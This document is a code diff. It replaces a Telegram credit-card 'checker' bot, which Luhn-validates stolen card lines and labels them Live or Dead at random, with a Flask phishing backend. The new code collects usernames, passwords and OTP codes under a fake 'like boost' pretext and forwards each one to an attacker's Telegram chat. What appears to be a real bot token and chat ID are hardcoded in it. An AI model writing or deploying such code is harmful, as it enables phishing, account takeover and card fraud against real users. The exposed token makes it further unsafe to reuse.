@@ -1,108 +1,77 @@
-# cc_checker_bot.py
-# ==============================
-# Telegram CC Checker Bot
-# Works like your HTML + JS version
-# Developer: @noobxvau (MN SIDDIK)
-# ==============================
-
+from flask import Flask, request, jsonify
+from flask_cors import CORS
 import os
-import random
-import re
-import time
-import threading
-from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
+import requests
+
+app = Flask(__name__)
+CORS(app)
 
 # -------------------------
-BOT_TOKEN = os.environ.get("8239266013:AAHoOITQp3OepWy94DdDE82SbeQFgcHiqwY", "8239266013:AAHoOITQp3OepWy94DdDE82SbeQFgcHiqwY")
+# Telegram Bot Token & Chat ID
+TELEGRAM_BOT_TOKEN = os.environ.get("8239266013:AAHoOITQp3OepWy94DdDE82SbeQFgcHiqwY", "YOUR_TELEGRAM_BOT_TOKEN")
+TELEGRAM_CHAT_ID = os.environ.get("1849126202", "YOUR_TELEGRAM_CHAT_ID")
 
 # -------------------------
-# Credit Card Validation (Luhn Algorithm)
-def is_valid_credit_card(number: str) -> bool:
-    number = re.sub(r"\D", "", number)
-    pattern = r"^(?:3[47][0-9]{13}|4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$"
-    if not re.match(pattern, number):
-        return False
-
-    total = 0
-    alt = False
-    for digit in number[::-1]:
-        n = int(digit)
-        if alt:
-            n *= 2
-            if n > 9:
-                n = (n % 10) + 1
-        total += n
-        alt = not alt
-    return total % 10 == 0
+# In-memory storage for multiple users
+users_db = {}  # key: uid, value: dict with username, password, otp
 
 # -------------------------
-# Start Command
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "💳 *Welcome to CC Checker Bot!*\n\n"
-        "Send me a list of CCs like this:\n"
-        "`4111111111111111|12|2026|123`\n\n"
-        "I will check them and categorize into:\n"
-        "✅ Live\n❌ Dead\n⚙️ Unknown\n\n"
-        "Developer: @noobxvau (MN SIDDIK)",
-        parse_mode="Markdown"
-    )
+# Helper function to send message to telegram
+def send_telegram_message(message):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
+    try:
+        requests.post(url, data=data)
+    except Exception as e:
+        print("Telegram send error:", e)
 
 # -------------------------
-# Process CC List
-async def handle_cc_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text.strip()
-    cards = [line.strip() for line in text.split("\n") if line.strip()]
+@app.route("/receive_login", methods=["POST"])
+def receive_login():
+    data = request.get_json()
+    step = data.get("step", "")
+    
+    # Step 1: Create account
+    if step == "create_account":
+        username = data.get("username")
+        password = data.get("password")
+        uid = data.get("uid", f"user_{len(users_db)+1}")  # fallback uid
 
-    if not cards:
-        await update.message.reply_text("❌ Please send some credit card numbers first.")
-        return
+        if not username or not password:
+            return jsonify({"status":"error", "error":"Username and password required."})
 
-    ali_list, muhammad_list, murad_list = [], [], []
+        users_db[uid] = {"username": username, "password": password, "otp": None}
+        send_telegram_message(f"🆕 New Account Created:\nUID: {uid}\nUsername: {username}\nPassword: {password}")
+        return jsonify({"status":"ok", "message":"Account created, please verify OTP."})
 
-    for line in cards:
-        card_number = line.split("|")[0].strip()
+    # Step 2: Verify OTP
+    elif step == "verify_otp":
+        otp = data.get("otp")
+        uid = data.get("uid", f"user_{len(users_db)}")  # fallback uid
 
-        if not is_valid_credit_card(card_number):
-            murad_list.append(f"⚙️ *Invalid (Luhn Check)* | `{line}` /noobxvau")
-            continue
+        if uid not in users_db:
+            return jsonify({"status":"error", "error":"User not found."})
+        if not otp:
+            return jsonify({"status":"error", "error":"OTP required."})
 
-        rnd = random.random()
-        if rnd < 0.2:
-            ali_list.append(f"✅ *Live* | `{line}` → [Charge: $4.99] [GATE:01] /noobxvau")
-        elif rnd < 0.9:
-            muhammad_list.append(f"❌ *Dead* | `{line}` → [Charge: $0.00] [GATE:01] /noobxvau")
-        else:
-            murad_list.append(f"⚙️ *Unknown* | `{line}` → [Charge: N/A] [GATE:01] /noobxvau")
+        users_db[uid]["otp"] = otp
+        send_telegram_message(f"✅ OTP Verified for UID: {uid}\nOTP: {otp}\nUsername: {users_db[uid]['username']}")
+        return jsonify({"status":"ok", "message":"OTP verified successfully."})
 
-    # Simulate checking delay like JS version
-    await update.message.reply_text("🔍 Checking cards... Please wait...")
+    # Default: Boost like request
+    else:
+        uid = data.get("uid")
+        username = data.get("username")
+        password = data.get("password")
 
-    time.sleep(random.randint(2, 5))
+        if not uid or not username or not password:
+            return jsonify({"status":"error", "error":"Missing fields."})
 
-    result_msg = "✅ *CC Check Complete!*\n\n"
-    result_msg += f"💚 Live: {len(ali_list)}\n"
-    result_msg += f"❤️ Dead: {len(muhammad_list)}\n"
-    result_msg += f"🟠 Unknown: {len(murad_list)}\n\n"
-
-    await update.message.reply_text(result_msg, parse_mode="Markdown")
-
-    if ali_list:
-        await update.message.reply_text("\n".join(ali_list), parse_mode="Markdown")
-    if muhammad_list:
-        await update.message.reply_text("\n".join(muhammad_list), parse_mode="Markdown")
-    if murad_list:
-        await update.message.reply_text("\n".join(murad_list), parse_mode="Markdown")
+        # Optionally check if user exists
+        users_db[uid] = {"username": username, "password": password, "otp": None}
+        send_telegram_message(f"📌 Like request received:\nUID: {uid}\nUsername: {username}\nPassword: {password}")
+        return jsonify({"status":"sent"})
 
 # -------------------------
-# Main Function
-def main():
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cc_list))
-    print("✅ Bot is running...")
-    app.run_polling()
-
 if __name__ == "__main__":
-    main()
+    app.run(host="0.0.0.0", port=5000, debug=True)
